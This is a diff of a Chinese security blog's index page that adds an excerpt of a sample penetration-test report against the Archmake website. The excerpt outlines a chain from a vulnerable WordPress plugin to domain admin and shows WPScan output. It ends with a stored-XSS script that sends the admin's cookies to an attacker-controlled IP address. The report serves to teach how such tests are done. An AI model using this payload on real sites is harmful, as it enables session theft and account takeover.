@@ -51,9 +51,9 @@
     
     
     | 
-    <a href='/tag/渗透测试/'>渗透测试</a>,
+    <a href='/tag/Offensive-security/'>Offensive security</a>,
     
-    <a href='/tag/Offensive-security/'>Offensive security</a>
+    <a href='/tag/渗透测试/'>渗透测试</a>
     
     
 </span>
@@ -68,6 +68,45 @@
       
       <p>
           <a href="/1055.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-09-23T19:03:03.000Z" itemprop="datePublished">
+          2013-09-24
+      </time>
+    
+    
+    | 
+    <a href='/tag/xss/'>xss</a>,
+    
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/Offensive-security/'>Offensive security</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1029.seo/">一份Archmake.COM的渗透测试报告</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>前言</p>  <p>这是<a href="http://www.offensive-security.com/" target="_blank">offensive security</a>发布的一份渗透测试报告样例。offensive security 是backtrack-linux.org、exploit-db.com的缔造者。</p>  <h4>概述</h4>  <p><a href="http://www.offensive-security.com/" target="_blank">Offensive security</a>已经被授权对Archmake的外部网站进行一次渗透测试.测试评估的方式是模拟恶意的攻击者对公司进行目的明确的渗透.在初期的信息搜集阶段,发现Archmake公司仅仅只有一个web网站和一个邮件服务器.可供攻击的目标比较少.</p>  <p>在对网站的安全评估中,发现它安装了一个有漏洞的WordPress插件.成功利用这个漏洞,取得了<a href="http://Ha.Cker.In/tag/WordPress" target="_blank">WordPress</a>的管理权限.然后反弹了一个交互式的shell并成功提到root权限.</p>  <p>获取了网站服务器的权限之后,开始对内网进行渗透,经过一番尝试,成功获取到了域管理员的权限.之后对内网进行拓扑分析,发现了内网的公司数据库并成功控制.这个数据库不仅存储了订单信息和客户资料,还保存了交易的相关信息.通过控制这个系统,攻击者可以直接提取现金.</p>  <h4>测试过程</h4>  <h3>WordPress漏洞利用</h3>  <p>在对目标系统进行搜集的时候发现网站采用了wordpress 3.3.1搭建.我们在对WordPress进行代码审计的同时,用WPScan扫描了目标网站,发现一个不安全的插件:</p>  <pre>./wpscan.rb –url www.Archmake.com –enumerate p</pre><br><br><pre><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>__</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></pre><br><br><pre><strong></pre><br><br><pre><strong>_</strong></strong></pre><br><br><pre><strong>_</strong></pre><br><br><pre>\ \</pre><br><br><pre>/ / <strong> \ / __</strong>|</pre><br><br><pre>\ \ /\ / /| |<strong>) | (_</strong></pre><br><br><pre><strong>_ </strong> <em> </em> <strong></pre><br><br><pre>\ \/ \/ / | _</strong>/ _<strong> \ / </strong>|/ <em>` | ‘</em> \</pre><br><br><pre>\ /\ / | |</pre><br><br><pre><strong>__) | (</strong>| (<em>| | | | |</pre><br><br><pre>\/ \/</pre><br><br><pre>|</em>|</pre><br><br><pre>|<strong>_</strong>/ _<strong>|\</strong>,<em>|</em>| |<em>| v1.1</pre><br><br><pre>WordPress Security Scanner by ethicalhack3r.co.uk</pre><br><br><pre>Sponsored by the RandomStorm Open Source Initiative</pre><br><br><pre><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>__</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em></pre><br><br><pre>| URL: <a href="http://www.Archmake.com/">http://www.Archmake.com/</a></pre><br><br><pre>| Started on Tue Jan 24 18:44:49 2012</pre><br><br><pre>[!] The WordPress theme in use is called &quot;twentyeleven&quot;.</pre><br><br><pre>[!] The WordPress &quot;<a href="http://www.Archmake.com/readme.html&amp;quot">http://www.Archmake.com/readme.html&amp;quot</a>; file exists.</pre><br><br><pre>[!] WordPress version 3.3.1 identified from meta generator.</pre><br><br><pre>[+] Enumerating installed plugins…</pre><br><br><pre>Checking for 2892 total plugins… 100% complete.</pre><br><br><pre>[+] We found 2 plugins:</pre><br><br><pre>Name: relevanssi</pre><br><br><pre>Location: <a href="http://www.Archmake.com/wp-content/plugins/relevanssi/">http://www.Archmake.com/wp-content/plugins/relevanssi/</a></pre><br><br><pre>Directory listing enabled? Yes.</pre><br><br><pre>Name: relevanssi</pre><br><br><pre>Location: <a href="http://www.Archmake.com/wp-content/plugins/relevanssi/">http://www.Archmake.com/wp-content/plugins/relevanssi/</a></pre><br><br><pre>Directory listing enabled? Yes.</pre><br><br><pre>[+] There were 1 vulnerabilities identified from the plugin names:</pre><br><br><pre>[!] Relevanssi 2.7.2 WordPress Plugin Stored XSS Vulnerability</pre><br><br><pre>* Reference: <a href="http://www.exploit-db.com/exploits/16233/">http://www.exploit-db.com/exploits/16233/</a></pre><br><br><pre>[+] Finished at Tue Jan 24 18:45:30 2012 </pre><br><br><p>正如WPScan扫描结果展示的一样,这个Relevanssi插件存在一个<a href="http://Ha.Cker.In/tag/XSS" target="_blank">XSS</a>漏洞.成功利用这个<a href="http://Ha.Cker.In/tag/漏洞" target="_blank">漏洞</a>可以窃取到管理员的cookies.</p>
+
+<p>第一步,我们在Archmake网站的搜索栏中插入如下代码:</p>
+
+<pre>&lt;script&gt;new Image().src=&quot;http://172.16.40.204/p.php?cookie=&quot;+document.cookie; &lt;/script&gt;</pre>
+
+<p><a href="http://img.cker.in/Archmake.COM_99C0/clip_image001.png"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="129" alt="clip_image001" src="http://img.cker.in/Archmake.COM_99C0/clip_image001_thumb.png" width="529" border="0" /></a></p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/1029.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
